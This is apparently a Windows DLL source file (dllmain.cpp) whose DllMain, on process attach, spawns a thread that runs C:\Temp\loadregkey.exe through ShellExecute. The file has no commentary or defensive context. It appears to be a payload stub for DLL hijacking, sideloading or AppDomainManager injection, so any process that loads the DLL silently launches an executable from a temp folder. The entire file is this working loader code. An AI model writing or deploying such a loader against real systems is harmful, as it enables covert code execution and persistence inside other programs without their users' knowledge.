// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"
#include "MSCorEE.h"
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include "ShellAPI.h";

extern "C" __declspec(dllexport)

DWORD WINAPI loadregThread(LPVOID lpParam) {
    ShellExecute(NULL, L"open", L"C:\\Temp\\loadregkey.exe", NULL, NULL, SW_SHOWDEFAULT);
    return 0;
}

extern "C" __declspec(dllexport)

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, loadregThread, NULL, NULL, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

